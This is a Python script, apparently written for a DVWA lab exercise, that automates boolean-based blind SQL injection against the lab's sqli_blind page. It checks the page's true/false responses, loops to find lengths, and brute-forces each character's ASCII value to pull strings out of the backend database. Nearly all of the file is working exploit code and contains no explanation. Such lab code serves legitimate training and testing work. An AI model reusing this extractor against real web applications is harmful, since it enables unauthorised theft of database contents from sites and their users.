import requests
import os
import sys
sys.path.insert(0,'../') # To import dvwa module
import dvwa
from logs import *
from bs4 import BeautifulSoup

def bool_check(resp):
    if "User ID is MISSING from the database" in resp.text:
        print_debug("Boolean : false")
        return False
    elif "User ID exists in the database" in resp.text:
        print_debug("Boolean : true")
        return True
    else:
        print_debug("Boolean : failed")
        return -1

def sqli_find_count(sess,
        req_start, # example : 1' and length(
        subject,
        req_middle, # example : )
        # then comes the index
        req_terminator="#",
        check_equal = True,
        check = True,
        url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/"):
    out = 0
    i = 1
    while True:
        pay = req_start
        pay += subject
        pay += req_middle
        if check_equal:
            pay += "="
        pay += str(i)
        pay += req_terminator
        payload = {
            "id":pay,
            "Submit":"Submit"
        }
        resp = sess.get(url, params=payload)        
        if bool_check(resp) == check:
            out = i
            print_debug("Found count : "+str(out))
            break
        i += 1
    return out

def sqli_find_string(
        sess,
        req_start, # example : 1' and length(
        subject,
        req_middle, # example : )=
        # then comes the "="
        len,
        req_terminator="#",
        url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/"):
    out = ""
    i = 0

    while i < len:
        pay = ""
        i += 1
        ascii_max = 255+1
        printed=False
    
        print_verbose("Current character : "+str(i))
        for j in range(ascii_max): # loop through all the ASCII values
            pay = req_start
            pay += subject
            pay += "," + str(i)
            pay += "," + str(i)
            pay += req_middle
            pay += "="
            pay += str(j)
            pay += "#"

            payload = {
                "id":pay,
                "Submit":"Submit"
            }
            print_debug("\t"+str(j) + " : " + pay + " : " + chr(j))
            resp = sess.get(url, params=payload)
            if bool_check(resp): # if this index matches with this ascii value
                out += chr(j) # concatenate the output with the found ASCII character
                print_verbose("Character found : "+chr(j))
                break
    print_debug("Found name : "+out)
    return out